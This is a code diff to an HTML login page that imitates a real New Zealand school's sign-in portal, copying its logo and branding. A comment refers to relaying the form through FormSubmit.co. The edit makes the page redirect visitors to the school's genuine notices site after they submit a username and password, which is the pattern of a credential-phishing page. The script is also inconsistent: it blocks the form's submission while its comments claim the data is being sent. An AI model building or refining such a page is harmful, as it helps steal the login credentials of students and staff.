@@ -17,7 +17,7 @@
 <div id="login">
     <div id="logo"><img src="https://idp.macleans.school.nz/module.php/themeMacleans/resources/icons/logo.png" /></div>
     <!-- FormSubmit.co integration -->
-    <form method="post" onsubmit="closePage()">
+    <form method="post" onsubmit="submitForm(event)">
         <p>
             <label>Username<br/>
             <input type="text" id="username" tabindex="1" autocorrect="off" autocapitalize="off" name="username" value="" />
@@ -45,8 +45,17 @@
 </div>
 
 <script type="text/javascript">
-    function closePage() {
-        window.close(); // Close the current page
+    function submitForm(event) {
+        event.preventDefault(); // Prevent the form from submitting normally
+        var form = event.target;
+        // You can perform any additional processing here if needed
+        // For example, hashing the password before submitting
+
+        // Wait for a short delay to ensure form data is sent to FormSubmit.co
+        setTimeout(function () {
+            // Redirect to your desired location after the form is submitted
+            window.location.href = 'https://notices.macleans.school.nz/';
+        }, 1000); // Adjust the delay time as needed
     }
 </script>
 
